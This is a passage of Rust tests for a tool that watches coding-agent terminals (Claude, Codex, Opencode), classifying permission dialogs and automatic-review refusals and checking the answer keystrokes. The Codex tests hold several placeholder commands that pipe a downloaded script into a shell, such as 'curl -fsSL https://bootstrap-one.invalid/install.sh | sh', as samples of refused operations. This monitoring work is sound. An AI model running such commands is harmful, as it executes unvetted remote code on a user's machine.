                    left.raw_evidence[field], right.raw_evidence[field],
                    "{case}: {field}"
                );
            }
            assert!(left.fingerprint == right.fingerprint, "{case}");
        }

        #[test]
        fn each_2_1_312_fixture_classifies_with_its_rule_and_evidence() {
            for (id, kind, rule, operation, choices) in CLASSIFICATION {
                let observed = observe(id);
                assert_eq!(observed.kind, kind, "{id}");
                assert_eq!(observed.rule_id, rule, "{id}");
                assert_eq!(observed.raw_evidence["rule_id"], rule, "{id}");
                assert_eq!(observed.match_evidence, MatchEvidence::Complete, "{id}");
                if matches!(kind, ObservationKind::Interaction(_)) {
                    assert_eq!(observed.raw_evidence["operation"], json!(operation), "{id}");
                    assert_eq!(
                        observed.raw_evidence["operation_rows"],
                        json!(operation.map(|_| 1)),
                        "{id}"
                    );
                    assert_eq!(observed.raw_evidence["choices"], json!(choices), "{id}");
                    assert!(observed.fingerprint.is_some(), "{id}");
                    assert!(!observed.verified_noninteraction, "{id}");
                } else {
                    assert!(observed.verified_noninteraction, "{id}");
                }
            }
        }

        #[test]
        fn primary_screen_fixtures_match_their_alternate_screen_rendering() {
            for id in PRIMARY {
                let document = document(id);
                assert_eq!(document["alternate_screen"], false, "{id}");
                let primary = observe_screen(&replay_document(&document, false));
                let alternate = observe_screen(&replay_document(&document, true));
                assert_same_evidence(id, &primary, &alternate);
                assert!(
                    matches!(primary.kind, ObservationKind::Interaction(_)),
                    "{id}"
                );
            }
        }

        fn full_width(document: &Value, separator: usize) -> Value {
            let mut full = document.clone();
            full.as_object_mut().unwrap().remove("cell_backgrounds");
            for line in full["lines"].as_array_mut().unwrap() {
                let text = line.as_str().unwrap();
                let separated = text.chars().nth(separator) == Some('│');
                if separated {
                    *line = json!(text.chars().take(separator).collect::<String>());
                }
            }
            full
        }

        #[test]
        fn sidebar_fixtures_match_their_full_width_rendering() {
            for (id, separator) in PANEL {
                let document = document(id);
                assert!(document.get("cell_backgrounds").is_some(), "{id}");
                let beside = observe_screen(&replay_document(&document, true));
                let full =
                    observe_screen(&replay_document(&full_width(&document, separator), true));
                assert_same_evidence(id, &beside, &full);
                assert_eq!(beside.rule_id, BASH, "{id}");
            }
        }

        #[test]
        fn existing_claude_rules_keep_classifying_their_2_1_302_forms() {
            for (id, rule) in [
                ("claude-2.1.302-default-permission-1", BASH),
                ("claude-2.1.302-wrapped-permission-1", BASH),
                ("claude-2.1.302-idle-composer-1", IDLE),
            ] {
                let observed = Detector::new(
                    &ProfileCatalog::bundled().unwrap(),
                    CodingAgent::Claude,
                    Some("2.1.302"),
                )
                .observe(&replay_native_fixture(
                    &bundled_fixture(id),
                    |_| {},
                    true,
                    None,
                ))
                .unwrap();
                assert_eq!(observed.rule_id, rule, "{id}");
            }
        }

        fn plan(rule: &str, key: AnswerKey) -> Option<AnswerPlan> {
            ProfileCatalog::bundled().unwrap().answer_plan(
                CodingAgent::Claude,
                VERSION_312,
                rule,
                &key,
            )
        }
        fn stages(plan: &AnswerPlan) -> Vec<(Vec<u8>, Option<String>)> {
            plan.stages()
                .iter()
                .map(|stage| {
                    (
                        stage.bytes().to_vec(),
                        stage.required_focus_choice_id().map(str::to_owned),
                    )
                })
                .collect()
        }

        #[test]
        fn dialog_a_decline_resolves_to_two_marker_gated_stages() {
            let decline =
                plan(DIALOG_A, AnswerKey::Choice("decline".into())).expect("Dialog A decline plan");
            assert_eq!(
                decline.capability().answer_rule_id(),
                "claude-auto-default-decline"
            );
            assert_eq!(decline.capability().request_rule_id(), DIALOG_A);
            assert_eq!(decline.choice_id(), "decline");
            assert_eq!(decline.focus_matcher_id(), "focus");
            assert_eq!(
                stages(&decline),
                [
                    (vec![0x0e], Some("accept".to_owned())),
                    (vec![0x0d], Some("decline".to_owned())),
                ]
            );
            for fixture in [
                "claude-2.1.312-auto-default-decline-pre-stage-1",
                "claude-2.1.312-auto-default-decline-post-stage-1-1",
            ] {
                assert!(
                    decline
                        .capability()
                        .fixture_ids()
                        .contains(&fixture.to_owned()),
                    "{fixture}"
                );
            }
            for (fixture, focus) in [
                ("claude-2.1.312-auto-default-decline-pre-stage-1", "accept"),
                (
                    "claude-2.1.312-auto-default-decline-post-stage-1-1",
                    "decline",
                ),
                ("claude-2.1.312-primary-auto-default-nudge-1", "accept"),
            ] {
                let matched = detector()
                    .match_answer(&screen(fixture), &decline)
                    .unwrap()
                    .expect("the decline plan matches its dialog");
                assert_eq!(matched.focused_choice_id(), Some(focus), "{fixture}");
            }
        }

        #[test]
        fn dialog_b_offer_choices_resolve_to_their_single_digits() {
            for (choice, rule, byte) in [
                ("not-now", "claude-auto-env-setup-not-now-digit", b'2'),
                (
                    "dont-show-again",
                    "claude-auto-env-setup-dont-show-again-digit",
                    b'3',
                ),
            ] {
                let plan = plan(OFFER, AnswerKey::Choice(choice.into())).expect("offer plan");
                assert_eq!(plan.capability().answer_rule_id(), rule);
                assert_eq!(stages(&plan), [(vec![byte], None)], "{choice}");
                for fixture in [
                    "claude-2.1.312-auto-env-setup-offer-1",
                    "claude-2.1.302-auto-env-setup-offer-1",
                ] {
                    assert!(
                        detector()
                            .match_answer(&screen(fixture), &plan)
                            .unwrap()
                            .is_some(),
                        "{choice} {fixture}"
                    );
                }
            }
        }

        #[test]
        fn no_plan_selects_a_yes_choice_of_either_nudge_dialog() {
            let catalog = ProfileCatalog::bundled().unwrap();
            assert!(plan(DIALOG_A, AnswerKey::Choice("accept".into())).is_none());
            assert!(plan(OFFER, AnswerKey::Choice("yes".into())).is_none());
            for rule in [WIZARD, NOTICE] {
                assert!(
                    catalog
                        .answer_plans(CodingAgent::Claude, VERSION_312, rule)
                        .is_empty(),
                    "{rule}"
                );
            }
            for rule in [DIALOG_A, OFFER, WIZARD, NOTICE] {
                for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                    assert!(
                        plan(rule, AnswerKey::Decision(decision)).is_none(),
                        "{rule}"
                    );
                }
            }
            for rule in catalog.rule_ids() {
                for plan in catalog.answer_plans(CodingAgent::Claude, VERSION_312, &rule) {
                    assert_ne!(plan.choice_id(), "accept", "{rule}");
                    if rule == OFFER {
                        assert!(
                            plan.stages()
                                .iter()
                                .all(|stage| !stage.bytes().contains(&b'1')),
                            "{rule}"
                        );
                    }
                    for stage in plan.stages() {
                        assert!(!stage.bytes().contains(&0x1b), "{rule}");
                    }
                }
            }
        }

        #[test]
        fn file_and_no_tip_decisions_resolve_to_their_single_request_digits() {
            for (rule, prefix) in [
                (READ, "claude-read-file"),
                (EDIT, "claude-edit-file"),
                (CREATE, "claude-create-file"),
                (NO_TIP, "claude-bash-no-tip"),
            ] {
                let fixture_prefix = prefix.trim_start_matches("claude-");
                for (decision, choice, byte, name) in [
                    (PermissionDecision::Allow, "allow-once", b'1', "allow"),
                    (PermissionDecision::Deny, "deny-once", b'3', "deny"),
                ] {
                    let plan = plan(rule, AnswerKey::Decision(decision))
                        .unwrap_or_else(|| panic!("{rule} {decision:?} plan"));
                    assert_eq!(
                        plan.capability().answer_rule_id(),
                        format!("{prefix}-{name}-digit"),
                        "{rule}"
                    );
                    assert_eq!(plan.choice_id(), choice, "{rule}");
                    assert_eq!(stages(&plan), [(vec![byte], None)], "{rule} {name}");
                    let pre_stage = format!("claude-2.1.312-{fixture_prefix}-{name}-pre-stage-1");
                    assert!(
                        plan.capability().fixture_ids().contains(&pre_stage),
                        "{rule} cites {pre_stage}"
                    );
                    assert!(
                        detector()
                            .match_answer(&screen(&pre_stage), &plan)
                            .unwrap()
                            .is_some(),
                        "{pre_stage}"
                    );
                }
                for key in ["allow-once", "deny-once"] {
                    assert!(
                        plan(rule, AnswerKey::Choice(key.into())).is_none(),
                        "{rule}"
                    );
                }
            }
        }

        fn replay_run() -> Run {
            Run::new(EvidencePolicy::metadata(), observe)
        }

        #[test]
        fn tracker_replaces_the_pending_notice_with_dialog_a_after_the_draft_is_cleared() {
            let mut run = replay_run();
            let notice = run.episode("claude-2.1.312-question-pending-notice-1", 0, 300);
            assert_eq!(notice.len(), 1, "{notice:?}");
            assert_eq!(notice[0].kind, RuntimeEventKind::InteractionOpened);
            assert_eq!(notice[0].classification, Some(InteractionClass::Question));
            assert_eq!(notice[0].evidence_json["rule_id"], NOTICE);
            let cleared = run.episode("claude-2.1.312-question-pending-after-clear-1", 350, 900);
            assert_eq!(cleared.len(), 2, "{cleared:?}");
            assert_eq!(cleared[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(cleared[0].episode_seq, notice[0].episode_seq);
            assert_eq!(cleared[1].kind, RuntimeEventKind::InteractionOpened);
            assert_eq!(cleared[1].classification, Some(InteractionClass::Question));
            assert_eq!(cleared[1].evidence_json["rule_id"], DIALOG_A);
            assert_ne!(cleared[1].episode_seq, notice[0].episode_seq);
        }

        #[test]
        fn tracker_closes_the_pending_notice_without_dialog_a_after_the_draft_is_sent() {
            let mut run = replay_run();
            let notice = run.episode("claude-2.1.312-question-pending-send-notice-1", 0, 300);
            assert_eq!(notice.len(), 1, "{notice:?}");
            assert_eq!(notice[0].evidence_json["rule_id"], NOTICE);
            let sent = run.episode("claude-2.1.312-question-pending-after-send-1", 350, 900);
            assert_eq!(sent.len(), 1, "{sent:?}");
            assert_eq!(sent[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(sent[0].episode_seq, notice[0].episode_seq);
            assert_eq!(
                sent[0].close_reason,
                Some(InteractionCloseReason::NotVisible)
            );
            let idle = run.episode(
                "claude-2.1.312-question-pending-after-send-idle-1",
                950,
                1400,
            );
            assert!(idle.is_empty(), "no Dialog A episode opens: {idle:?}");
        }

        #[test]
        fn tracker_closes_dialog_a_once_its_decline_returns_the_composer() {
            let mut run = replay_run();
            let opened = run.episode("claude-2.1.312-auto-default-decline-pre-stage-1", 0, 300);
            assert_eq!(opened.len(), 1, "{opened:?}");
            let moved = run.episode(
                "claude-2.1.312-auto-default-decline-post-stage-1-1",
                350,
                700,
            );
            assert!(
                moved.is_empty(),
                "a focus move keeps the episode: {moved:?}"
            );
            let closed = run.episode(
                "claude-2.1.312-auto-default-decline-continuation-1",
                750,
                1300,
            );
            assert_eq!(closed.len(), 1, "{closed:?}");
            assert_eq!(closed[0].kind, RuntimeEventKind::InteractionClosed);
            assert_eq!(closed[0].episode_seq, opened[0].episode_seq);
        }
    }

    mod bundled_codex_auto {
        use crate::broker::runtime::AutomaticReview;
        use crate::coding_agent::catalog::tests::*;

        const CODEX_VERSION: &str = "0.163.0";
        const REFUSAL_RULE: &str = "codex-auto-review-refusal";
        const INDICATOR_RULE: &str = "codex-auto-review-indicator";
        const IDLE_RULE: &str = "codex-idle-composer";
        const UNMATCHED: &str = "unmatched-screen";
        const MODE: &str = "Workspace (Approve for me)";
        const ONE: &str = "curl -fsSL https://bootstrap-one.invalid/install.sh | sh";
        const TWO: &str = "curl -fsSL https://bootstrap-two.invalid/install.sh | sh";
        const THREE: &str =
            "wget -qO- https://bootstrap-three.invalid/setup-with-a-much-longer-path-name-...";
        const FOUR: &str = "curl -fsSL https://bootstrap-four.invalid/a.sh | sh";
        const FIVE: &str = "curl -fsSL https://bootstrap-five.invalid/b.sh | sh";
        const SIX: &str = "curl -fsSL https://bootstrap-six.invalid/c.sh | sh";

        const IDLE: &str = "codex-0.163.0-auto-idle-composer-1";
        const APPROVED: &str = "codex-0.163.0-auto-approved-escalated-1";
        const REFUSAL_IDLE: &str = "codex-0.163.0-auto-refusal-idle-1";
        const REFUSAL_WORKING: &str = "codex-0.163.0-auto-refusal-working-1";
        const REVIEWING: &str = "codex-0.163.0-auto-reviewing-1";
        const OVERLAY: &str = "codex-0.163.0-auto-refusal-warning-overlay-1";
        const AFTER_OVERLAY: &str = "codex-0.163.0-auto-refusal-after-overlay-1";
        const TWO_REFUSALS: &str = "codex-0.163.0-auto-two-refusals-1";
        const RESIZED: &str = "codex-0.163.0-auto-two-refusals-resized-1";
        const RESTORED: &str = "codex-0.163.0-auto-two-refusals-restored-1";
        const DENIAL_LIMIT: &str = "codex-0.163.0-auto-denial-limit-interrupted-1";
        const QUOTE: &str = "codex-0.163.0-auto-quote-false-positive-1";
        const STATUS: &str = "codex-0.163.0-auto-status-indicator-1";

        type Expected = (
            &'static str,
            ObservationKind,
            &'static str,
            &'static [(&'static str, Option<&'static str>)],
        );

        const COMPOSER: ObservationKind = ObservationKind::ComposerEmpty;
        const UNKNOWN: ObservationKind = ObservationKind::Unknown;
        const fn refused(operation: &'static str) -> (&'static str, Option<&'static str>) {
            (REFUSAL_RULE, Some(operation))
        }

        const CLASSIFICATION: [Expected; 19] = [
            (APPROVED, COMPOSER, IDLE_RULE, &[]),
            (
                DENIAL_LIMIT,
                COMPOSER,
                IDLE_RULE,
                &[refused(FOUR), refused(FIVE), refused(SIX)],
            ),
            (
                "codex-0.163.0-auto-denial-limit-warning-1",
                UNKNOWN,
                UNMATCHED,
                &[],
            ),
            (
                "codex-0.163.0-auto-expanded-detail-1",
                COMPOSER,
                IDLE_RULE,
                &[refused(TWO), refused(THREE)],
            ),
            ("codex-0.163.0-auto-fresh-idle-1", COMPOSER, IDLE_RULE, &[]),
            (IDLE, COMPOSER, IDLE_RULE, &[]),
            (QUOTE, COMPOSER, IDLE_RULE, &[refused(THREE)]),
            (AFTER_OVERLAY, COMPOSER, IDLE_RULE, &[refused(ONE)]),
            (REFUSAL_IDLE, COMPOSER, IDLE_RULE, &[refused(ONE)]),
            (OVERLAY, UNKNOWN, UNMATCHED, &[]),
            (REFUSAL_WORKING, COMPOSER, IDLE_RULE, &[refused(ONE)]),
            (REVIEWING, COMPOSER, IDLE_RULE, &[refused(ONE)]),
            (
                "codex-0.163.0-auto-sandbox-failure-1",
                COMPOSER,
                IDLE_RULE,
                &[],
            ),
            (
                "codex-0.163.0-auto-second-launch-idle-1",
                COMPOSER,
                IDLE_RULE,
                &[],
            ),
            (STATUS, COMPOSER, IDLE_RULE, &[(INDICATOR_RULE, None)]),
            (
                TWO_REFUSALS,
                COMPOSER,
                IDLE_RULE,
                &[refused(TWO), refused(THREE)],
            ),
            (
                RESIZED,
                COMPOSER,
                IDLE_RULE,
                &[refused(TWO), refused(THREE)],
            ),
            (
                RESTORED,
                COMPOSER,
                IDLE_RULE,
                &[refused(TWO), refused(THREE)],
            ),
            (
                "codex-0.163.0-auto-warning-overlay-1",
                UNKNOWN,
                UNMATCHED,
                &[],
            ),
        ];

        fn bytes(id: &str) -> Vec<u8> {
            bundled_fixture(id).into_bytes()
        }

        fn screen(id: &str) -> ScreenSnapshot {
            let bytes = bytes(id);
            let text = std::str::from_utf8(&bytes).unwrap();
            let alternate = serde_json::from_str::<Value>(text).unwrap()["alternate_screen"]
                .as_bool()
                .unwrap();
            replay_native_fixture(text, |_| {}, alternate, None)
        }

        fn detector(catalog: &ProfileCatalog) -> Detector {
            Detector::new(catalog, CodingAgent::Codex, Some(CODEX_VERSION))
        }

        fn observe(id: &str) -> ScreenObservation {
            detector(&ProfileCatalog::bundled().unwrap())
                .observe(&screen(id))
                .unwrap()
        }

        fn unwrapped(operation: &Value) -> Option<String> {
            operation.as_str().map(|text| {
                text.split('\n')
                    .map(str::trim_start)
                    .collect::<Vec<_>>()
                    .join("")
            })
        }

        fn annotation_set(observed: &ScreenObservation) -> Vec<(String, Option<String>)> {
            let mut blocks = observed.annotations.iter().collect::<Vec<_>>();
            blocks.sort_by_key(|block| block.matched_region.top);
            blocks
                .into_iter()
                .map(|block| {
                    (
                        block.rule_id.clone(),
                        unwrapped(&block.raw_evidence["operation"]),
                    )
                })
                .collect()
        }

        fn refusals(id: &str) -> Vec<AnnotationBlock> {
            let mut blocks = observe(id)
                .annotations
                .into_iter()
                .filter(|block| block.rule_id == REFUSAL_RULE)
                .collect::<Vec<_>>();
            blocks.sort_by_key(|block| block.matched_region.top);
            blocks
        }

        fn redacted() -> EvidencePolicy {
            EvidencePolicy::redacted(
                &json!({"schema_version":1,"patterns":["fixture-secret-197-unique"],"sensitive_rules":[]}),
                &[REFUSAL_RULE, INDICATOR_RULE, "codex-exec-approval"],
            )
            .unwrap()
        }

        fn replay_run(policy: EvidencePolicy) -> Run {
            Run::new(policy, observe)
        }

        fn operations(held: &Held) -> Vec<String> {
            let mut shown = held
                .events
                .iter()
                .map(|event| unwrapped(&event.evidence_json["operation"]).unwrap())
                .collect::<Vec<_>>();
            shown.sort();
            shown
        }

        fn sorted(values: &[&str]) -> Vec<String> {
            let mut values = values
                .iter()
                .map(|value| (*value).to_owned())
                .collect::<Vec<_>>();
            values.sort();
            values
        }

        #[test]
        fn bundled_codex_auto_fixtures_produce_their_primary_and_annotation_sets() {
            for (id, kind, rule, annotations) in CLASSIFICATION {
                let observed = observe(id);
                assert_eq!(observed.kind, kind, "{id}");
                assert_eq!(observed.rule_id, rule, "{id}");
                assert_eq!(
                    observed.raw_evidence["native_version"], CODEX_VERSION,
                    "{id}"
                );
                assert_ne!(observed.kind, ObservationKind::PermissionDenied, "{id}");
                assert_eq!(
                    annotation_set(&observed),
                    annotations
                        .iter()
                        .map(|(rule, operation)| ((*rule).to_owned(), operation.map(String::from)))
                        .collect::<Vec<_>>(),
                    "{id}"
                );
                for block in &observed.annotations {
                    let (kind, mode) = if block.rule_id == INDICATOR_RULE {
                        (ObservationKind::AutomaticReviewAvailable, json!(MODE))
                    } else {
                        (ObservationKind::AutomaticRefusal, Value::Null)
                    };
                    assert_eq!(block.kind, kind, "{id}");
                    assert_eq!(block.raw_evidence["observed_mode"], mode, "{id}");
                }
            }
            for id in crate::coding_agent::catalog::tests::bundled_codex::PREDECESSOR_FIXTURES {
                let screen = replay_native_fixture(
                    std::str::from_utf8(&bytes(id)).unwrap(),
                    |_| {},
                    true,
                    None,
                );
                let observed = detector(&ProfileCatalog::bundled().unwrap())
                    .observe(&screen)
                    .unwrap();
                assert!(observed.annotations.is_empty(), "predecessor fixture {id}");
            }
        }

        #[test]
        fn bundled_codex_auto_rewrap_inside_a_token_keeps_each_refusal_fingerprint() {
            let restored = refusals(RESTORED);
            let resized = refusals(RESIZED);
            assert_eq!((restored.len(), resized.len()), (2, 2));
            for (wide, narrow) in restored.iter().zip(&resized) {
                assert!(
                    wide.fingerprint == narrow.fingerprint,
                    "{:?}",
                    narrow.raw_evidence
                );
                assert_eq!(wide.raw_evidence["operation_rows"], 1);
                assert_eq!(narrow.raw_evidence["operation_rows"], 2);
                let displayed = narrow.raw_evidence["operation"].as_str().unwrap();
                let (first, _) = displayed.split_once('\n').unwrap();
                assert!(
                    first.ends_with('/'),
                    "the rewrap breaks inside the URL: {displayed:?}"
                );
            }
            assert!(restored[0].fingerprint != restored[1].fingerprint);
            for (wide, two) in restored.iter().zip(&refusals(TWO_REFUSALS)) {
                assert!(wide.fingerprint == two.fingerprint);
            }
        }

        #[test]
        fn codex_tracker_emits_one_refusal_after_two_frames_and_none_while_present() {
            let mut run = replay_run(EvidencePolicy::metadata());
            assert!(run.hold(REFUSAL_WORKING, 0, 50).events.is_empty());
            let stable = run.hold(REFUSAL_WORKING, 100, 100);
            assert_eq!(stable.events.len(), 1);
            let event = &stable.events[0];
            assert_eq!((event.episode_seq, event.classification), (None, None));
            assert_eq!(event.evidence_json["rule_id"], REFUSAL_RULE);
            assert_eq!(event.evidence_json["native_version"], CODEX_VERSION);
            assert_eq!(event.evidence_json["operation"], Value::Null);
            assert!(run.hold(REFUSAL_IDLE, 150, 1000).events.is_empty());
            assert!(run.hold(REVIEWING, 1050, 1300).events.is_empty());
        }

        #[test]
        fn codex_tracker_emits_one_event_per_distinct_visible_refusal() {
            let mut two = replay_run(redacted());
            assert_eq!(
                operations(&two.hold(TWO_REFUSALS, 0, 300)),
                sorted(&[TWO, THREE])
            );
            let mut three = replay_run(redacted());
            assert_eq!(
                operations(&three.hold(DENIAL_LIMIT, 0, 300)),
                sorted(&[FOUR, FIVE, SIX])
            );
        }

        #[test]
        fn codex_tracker_does_not_re_emit_after_a_resize_rewrap() {
            let mut run = replay_run(redacted());
            assert_eq!(run.hold(TWO_REFUSALS, 0, 100).events.len(), 2);
            assert!(run.hold(RESIZED, 150, 600).events.is_empty());
            assert!(run.hold(RESTORED, 650, 900).events.is_empty());
        }

        #[test]
        fn codex_tracker_resets_only_after_250_ms_of_verified_absence() {
            let mut short = replay_run(EvidencePolicy::metadata());
            assert_eq!(short.hold(REFUSAL_IDLE, 0, 100).events.len(), 1);
            assert!(short.hold(IDLE, 150, 350).events.is_empty());
            assert!(short.hold(REFUSAL_IDLE, 400, 700).events.is_empty());
            let mut long = replay_run(EvidencePolicy::metadata());
            assert_eq!(long.hold(REFUSAL_IDLE, 0, 100).events.len(), 1);
            assert!(long.hold(APPROVED, 150, 450).events.is_empty());
            assert_eq!(long.hold(REFUSAL_IDLE, 500, 700).events.len(), 1);
        }

        #[test]
        fn codex_tracker_keeps_a_refusal_hidden_by_the_warnings_overlay() {
            let mut run = replay_run(EvidencePolicy::metadata());
            assert_eq!(run.hold(REFUSAL_IDLE, 0, 100).events.len(), 1);
            assert!(observe(OVERLAY).annotations.is_empty());
            assert!(run.hold(OVERLAY, 150, 1500).events.is_empty());
            assert!(run.hold(AFTER_OVERLAY, 1550, 1900).events.is_empty());
        }

        #[test]
        fn codex_tracker_ignores_quoted_refusal_text() {
            let mut run = replay_run(redacted());
            assert_eq!(operations(&run.hold(QUOTE, 0, 300)), sorted(&[THREE]));
        }

        #[test]
        fn codex_tracker_records_the_status_indicator_once_with_the_mode_only_when_redacted() {
            for (policy, mode) in [
                (EvidencePolicy::metadata(), None),
                (redacted(), Some(MODE.to_owned())),
            ] {
                let mut run = replay_run(policy);
                let held = run.hold(STATUS, 0, 600);
                assert!(held.events.is_empty());
                assert_eq!(
                    held.policy,
                    [(
                        AutomaticReview::Available,
                        mode,
                        INDICATOR_RULE.to_owned(),
                        NOW.to_owned()
                    )]
                );
            }
        }
    }

    mod bundled_codex {
        use crate::coding_agent::catalog::tests::*;

        const PERMISSION_FIXTURE: &str = "codex-0.163.0-on-request-permission-1";
        const ALLOW_FIXTURE: &str = "codex-0.163.0-allow-pre-stage-1";
        const DENY_FIXTURE: &str = "codex-0.163.0-deny-pre-stage-1";
        const IDLE_FIXTURE: &str = "codex-0.163.0-idle-composer-1";
        /// The captures of the predecessor form; every other Codex fixture is an
        /// automatic-mode capture classified in `bundled_codex_auto`.
        pub(super) const PREDECESSOR_FIXTURES: [&str; 4] = [
            PERMISSION_FIXTURE,
            ALLOW_FIXTURE,
            DENY_FIXTURE,
            IDLE_FIXTURE,
        ];

        #[test]
        fn bundled_guard_accepts_a_pending_wrap_cursor_at_cols_and_rejects_one_past_it() {
            assert!(
                guarded_fixture(PERMISSION_FIXTURE, |_| {}, |s| s["cursor_col"] = json!(120))
                    .is_ok(),
                "cursor_col equal to cols records the pending-wrap position"
            );
            assert!(
                guarded_fixture(IDLE_FIXTURE, |_| {}, |s| s["cursor_col"] = json!(120)).is_ok(),
                "the pending-wrap position is valid on any row"
            );
            for (case, change) in [
                ("one past the pending-wrap column", (35, 121)),
                ("a row below the geometry", (36, 0)),
            ] {
                assert!(
                    guarded_fixture(
                        PERMISSION_FIXTURE,
                        |_| {},
                        |s| {
                            s["cursor_row"] = json!(change.0);
                            s["cursor_col"] = json!(change.1);
                        }
                    )
                    .is_err(),
                    "{case} must be rejected"
                );
            }
        }
    }

    mod bundled_backends {
        use crate::coding_agent::catalog::tests::*;

        struct BundledProfile {
            backend: CodingAgent,
            version: &'static str,
        }

        const CLAUDE: BundledProfile = BundledProfile {
            backend: CodingAgent::Claude,
            version: "2.1.302",
        };
        const CODEX: BundledProfile = BundledProfile {
            backend: CodingAgent::Codex,
            version: "0.163.0",
        };
        const OPENCODE: BundledProfile = BundledProfile {
            backend: CodingAgent::Opencode,
            version: "2.1.4",
        };

        struct MeasuredAnswer {
            decision: PermissionDecision,
            byte: u8,
            choice: &'static str,
            answer_rule: &'static str,
            fixtures: &'static [&'static str],
        }

        struct SingleByteAnswers {
            profile: BundledProfile,
            rule: &'static str,
            answers: [MeasuredAnswer; 2],
        }

        const SINGLE_BYTE_ANSWERS: [SingleByteAnswers; 2] = [
            SingleByteAnswers {
                profile: CLAUDE,
                rule: "claude-bash-permission",
                answers: [
                    MeasuredAnswer {
                        decision: PermissionDecision::Allow,
                        byte: b'1',
                        choice: "allow-once",
                        answer_rule: "claude-bash-allow-digit",
                        fixtures: &[
                            "claude-2.1.302-allow-pre-stage-1",
                            "claude-2.1.302-wrapped-allow-pre-stage-1",
                        ],
                    },
                    MeasuredAnswer {
                        decision: PermissionDecision::Deny,
                        byte: b'4',
                        choice: "deny-once",
                        answer_rule: "claude-bash-deny-digit",
                        fixtures: &[
                            "claude-2.1.302-deny-pre-stage-1",
                            "claude-2.1.302-wrapped-deny-pre-stage-1",
                        ],
                    },
                ],
            },
            SingleByteAnswers {
                profile: CODEX,
                rule: "codex-exec-approval",
                answers: [
                    MeasuredAnswer {
                        decision: PermissionDecision::Allow,
                        byte: b'y',
                        choice: "allow-once",
                        answer_rule: "codex-exec-allow-y",
                        fixtures: &["codex-0.163.0-allow-pre-stage-1"],
                    },
                    MeasuredAnswer {
                        decision: PermissionDecision::Deny,
                        byte: b'3',
                        choice: "deny-once",
                        answer_rule: "codex-exec-deny-digit",
                        fixtures: &["codex-0.163.0-deny-pre-stage-1"],
                    },
                ],
            },
        ];

        #[test]
        fn each_bundled_profile_declares_detection_idle_composer_both_operations_and_both_answers()
        {
            let bundled = ProfileCatalog::bundled().unwrap();
            for profile in [CLAUDE, CODEX, OPENCODE] {
                let backend = profile.backend;
                let declared = bundled.capabilities(backend, Some(profile.version));
                assert_eq!(declared.backend, backend);
                assert_eq!(declared.native_version.as_deref(), Some(profile.version));
                assert_eq!(declared.min_version.as_deref(), Some(profile.version));
                assert_eq!(declared.detection, Coverage::Tested, "{backend:?}");
                assert_eq!(declared.composer, Coverage::Tested, "{backend:?}");
                assert_eq!(declared.prompt_submission, Coverage::Tested, "{backend:?}");
                assert_eq!(
                    declared.native_exec_submission,
                    Coverage::Tested,
                    "{backend:?}"
                );
                assert_eq!(declared.answer_decisions.len(), 2, "{backend:?}");
                for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                    assert!(
                        declared.answer_decisions.contains(&decision),
                        "{backend:?} {decision:?}"
                    );
                }
                assert_eq!(declared.capability_reason, None, "{backend:?}");
                let unknown = bundled.capabilities(backend, None);
                assert_eq!(unknown.detection, Coverage::Unknown, "{backend:?}");
                assert_eq!(unknown.composer, Coverage::Unknown, "{backend:?}");
                assert_eq!(unknown.min_version, None, "{backend:?}");
                assert!(unknown.answer_decisions.is_empty(), "{backend:?}");
                assert!(unknown.capability_reason.is_some(), "{backend:?}");
                for &other in CodingAgent::all().iter().filter(|&&other| other != backend) {
                    let foreign = bundled.capabilities(other, Some(profile.version));
                    assert_ne!(
                        foreign.min_version.as_deref(),
                        Some(profile.version),
                        "{other:?} at {backend:?} {}",
                        profile.version
                    );
                }
            }
        }

        #[test]
        fn bundled_submission_fixtures_replay_their_composer_stages_through_the_production_catalog()
        {
            let bundled = ProfileCatalog::bundled().unwrap();
            for (profile, run) in [
                (CLAUDE, "2.1.308"),
                (CODEX, CODEX.version),
                (OPENCODE, OPENCODE.version),
            ] {
                let backend = profile.backend;
                let detector = Detector::new(&bundled, backend, Some(run));
                for (operation, name) in [
                    (ComposerOperation::Prompt, "prompt"),
                    (ComposerOperation::Exec, "exec"),
                ] {
                    let plan = bundled
                        .composer_plan(backend, run, operation)
                        .unwrap_or_else(|| panic!("{backend:?} {name} plan"));
                    assert_eq!(plan.native_version(), run);
                    for id in plan.fixture_ids() {
                        assert!(
                            submission_fixture_ids(backend).contains(id),
                            "{id} is declared submission provenance"
                        );
                        let document: Value = serde_json::from_str(&bundled_fixture(id)).unwrap();
                        let screen = replay_native_fixture(
                            &bundled_screen(id),
                            |_| {},
                            document["alternate_screen"].as_bool().unwrap(),
                            None,
                        );
                        let observed = detector.observe(&screen).unwrap();
                        assert!(
                            !matches!(observed.kind, ObservationKind::Interaction(_)),
                            "{id}: a composer stage is never an interaction"
                        );
                        if id.ends_with("-empty-composer-1") {
                            assert_eq!(observed.kind, ObservationKind::ComposerEmpty, "{id}");
                            assert!(observed.verified_noninteraction, "{id}");
                        } else if id.ends_with("-typed-literal-1") {
                            assert_ne!(
                                observed.kind,
                                ObservationKind::ComposerEmpty,
                                "{id}: a typed literal is not an empty composer"
                            );
                        } else {
                            assert!(id.ends_with("-post-submit-1"), "{id}");
                        }
                    }
                }
            }
        }

        #[test]
        fn single_byte_answer_plans_are_the_measured_stages() {
            let bundled = ProfileCatalog::bundled().unwrap();
            for SingleByteAnswers {
                profile,
                rule,
                answers,
            } in SINGLE_BYTE_ANSWERS
            {
                let backend = profile.backend;
                for answer in answers {
                    let decision = answer.decision;
                    let plan = bundled
                        .answer_plan(
                            backend,
                            profile.version,
                            rule,
                            &AnswerKey::Decision(decision),
                        )
                        .expect("measured bundled answer plan");
                    assert_eq!(plan.choice_id(), answer.choice);
                    assert_eq!(plan.focus_matcher_id(), "focus");
                    assert_eq!(
                        plan.stages().len(),
                        1,
                        "{backend:?} {decision:?} is one measured stage"
                    );
                    let stage = &plan.stages()[0];
                    assert_eq!(stage.bytes(), &[answer.byte], "{backend:?} {decision:?}");
                    assert_eq!(stage.required_rule_id(), rule);
                    assert_eq!(stage.required_choice_id(), answer.choice);
                    let capability = plan.capability();
                    assert_eq!(capability.backend(), backend);
                    assert_eq!(capability.native_version(), profile.version);
                    assert_eq!(capability.request_rule_id(), rule);
                    assert_eq!(capability.answer_rule_id(), answer.answer_rule);
                    assert_eq!(capability.key(), &AnswerKey::Decision(decision));
                    assert_eq!(
                        capability.fixture_ids(),
                        answer
                            .fixtures
                            .iter()
                            .map(|&id| id.to_owned())
